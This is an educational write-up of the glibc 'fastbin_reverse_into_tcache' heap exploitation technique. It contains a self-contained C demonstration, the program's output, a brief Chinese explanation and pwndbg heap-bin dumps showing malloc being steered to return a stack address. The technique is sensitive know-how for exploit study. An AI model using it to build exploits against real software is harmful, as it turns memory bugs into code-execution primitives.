# fastbin_reverse_into_tcache

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);

  printf(
    "\n"
    "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
    "except it works with a small allocation size (allocsize <= 0x78).\n"
    "The goal is to set things up so that a call to malloc(allocsize) will write\n"
    "a large unsigned value to the stack.\n\n"
  );

  // Allocate 14 times so that we can free later.
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* victim = ptrs[7];
  printf(
    "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
    "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
    "already full, it will go in the fastbin.\n\n",
    victim
  );
  free(victim);

  printf(
    "Next we need to free between 1 and 6 more pointers. These will also go\n"
    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
    "cause a segmentation fault. But if the value on the stack is zero then\n"
    "a single free is sufficient.\n\n"
  );

  // Fill the fastbin.
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  printf(
    "The stack address that we intend to target: %p\n"
    "It's current value is %p\n",
    &stack_var[2],
    (char*)stack_var[2]
  );

  printf(
    "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
    "to overwrite the next pointer at address %p\n\n",
    victim
  );

  //------------VULNERABILITY-----------

  // Overwrite linked list pointer in victim.
  *(size_t**)victim = &stack_var[0];

  //------------------------------------

  printf(
    "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
  );

  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "Let's just print the contents of our array on the stack now,\n"
    "to show that it hasn't been modified yet.\n\n"
  );

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  printf(
    "\n"
    "The next allocation triggers the stack to be overwritten. The tcache\n"
    "is empty, but the fastbin isn't, so the next allocation comes from the\n"
    "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
    "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
    "address that we are targeting ends up being the first chunk in the tcache.\n"
    "It contains a pointer to the next chunk in the list, which is why a heap\n"
    "pointer is written to the stack.\n"
    "\n"
    "Earlier we said that the attack will also work if we free fewer than 6\n"
    "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
    "That's because the value on the stack is treated as a next pointer in the\n"
    "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
    "\n"
    "The contents of our array on the stack now look like this:\n\n"
  );

  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  printf(
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  assert(q == (char *)&stack_var[2]);

  return 0;
}
```

**result**

```c
This attack is intended to have a similar effect to the unsorted_bin_attack,
except it works with a small allocation size (allocsize <= 0x78).
The goal is to set things up so that a call to malloc(allocsize) will write
a large unsigned value to the stack.

First we need to free(allocsize) at least 7 times to fill the tcache.
(More than 7 times works fine too.)

The next pointer that we free is the chunk that we're going to corrupt: 0x5577dfaf5490
It doesn't matter if we corrupt it now or later. Because the tcache is
already full, it will go in the fastbin.

Next we need to free between 1 and 6 more pointers. These will also go
in the fastbin. If the stack address that we want to overwrite is not zero
then we need to free exactly 6 more pointers, otherwise the attack will
cause a segmentation fault. But if the value on the stack is zero then
a single free is sufficient.

The stack address that we intend to target: 0x7ffe4368a240
It's current value is 0xcdcdcdcdcdcdcdcd
Now we use a vulnerability such as a buffer overflow or a use-after-free
to overwrite the next pointer at address 0x5577dfaf5490

The next step is to malloc(allocsize) 7 times to empty the tcache.

Let's just print the contents of our array on the stack now,
to show that it hasn't been modified yet.

0x7ffe4368a230: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a238: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a240: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a248: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a250: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a258: 0xcdcdcdcdcdcdcdcd

The next allocation triggers the stack to be overwritten. The tcache
is empty, but the fastbin isn't, so the next allocation comes from the
fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.
Those 7 chunks are copied in reverse order into the tcache, so the stack
address that we are targeting ends up being the first chunk in the tcache.
It contains a pointer to the next chunk in the list, which is why a heap
pointer is written to the stack.

Earlier we said that the attack will also work if we free fewer than 6
extra pointers to the fastbin, but only if the value on the stack is zero.
That's because the value on the stack is treated as a next pointer in the
linked list and it will trigger a crash if it isn't a valid pointer or null.

The contents of our array on the stack now look like this:

0x7ffe4368a230: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a238: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a240: 0x5577dfaf5490
0x7ffe4368a248: 0x5577dfaf5010
0x7ffe4368a250: 0xcdcdcdcdcdcdcdcd
0x7ffe4368a258: 0xcdcdcdcdcdcdcdcd

Finally, if we malloc one more time then we get the stack address back: 0x7ffe4368a240
```

**analysis**

申请14个chunk，size：0x40，之后free掉7个用来填满tcache。然后，free(victim)，这里我们又用6个chunk来填充fastbin。

之后修改victim的fd指向栈上的一段空间。注意，victim是fastbin中的最后一个chunk，即最早释放的chunk。

清空tcache，之后再申请内存，这时tcache未满，bins不为空，所以程序会将fastbin中的chunk取出，这时取出第一个chunk，它正好满足了要求，所以被返回给用户。之后，程序将fastbin中的chunk依次取出填满tcache。由于我们修改了victim的fd指针，所以栈上的那段空间当作一个chunk，加入到了tcache中。

之后再次申请chunk，就会将栈上的chunk给我们。

**gdb**

填满tcache

```c
pwndbg> bins
tcachebins
0x50 [  7]: 0x555555757440 —▸ 0x5555557573f0 —▸ 0x5555557573a0 —▸ 0x555555757350 —▸ 0x555555757300 —▸ 0x5555557572b0 —▸ 0x555555757260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

free(victim)

```c
pwndbg> bins
tcachebins
0x50 [  7]: 0x555555757440 —▸ 0x5555557573f0 —▸ 0x5555557573a0 —▸ 0x555555757350 —▸ 0x555555757300 —▸ 0x5555557572b0 —▸ 0x555555757260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x555555757480 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

填充fastbin

```c
pwndbg> bins
tcachebins
0x50 [  7]: 0x555555757440 —▸ 0x5555557573f0 —▸ 0x5555557573a0 —▸ 0x555555757350 —▸ 0x555555757300 —▸ 0x5555557572b0 —▸ 0x555555757260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x555555757660 —▸ 0x555555757610 —▸ 0x5555557575c0 —▸ 0x555555757570 —▸ 0x555555757520 ◂— ...
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

修改指针

```c
pwndbg> x/10gx 0x555555757480
0x555555757480:	0x0000000000000000	0x0000000000000051
0x555555757490:	0x00007fffffffdd60	0x0000000000000000
0x5555557574a0:	0x0000000000000000	0x0000000000000000
0x5555557574b0:	0x0000000000000000	0x0000000000000000
0x5555557574c0:	0x0000000000000000	0x0000000000000000
```

清空tcache

```c
pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x555555757660 —▸ 0x555555757610 —▸ 0x5555557575c0 —▸ 0x555555757570 —▸ 0x555555757520 ◂— ...
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

申请chunk

```c
pwndbg> bins
tcachebins
0x50 [  7]: 0x7fffffffdd70 —▸ 0x555555757490 —▸ 0x5555557574e0 —▸ 0x555555757530 —▸ 0x555555757580 —▸ 0x5555557575d0 —▸ 0x555555757620 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0xcdcdcdcdcdcdcdcd
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

malloc(q)

```c
pwndbg> bins
tcachebins
0x50 [  6]: 0x555555757490 —▸ 0x5555557574e0 —▸ 0x555555757530 —▸ 0x555555757580 —▸ 0x5555557575d0 —▸ 0x555555757620 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0xcdcdcdcdcdcdcdcd
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

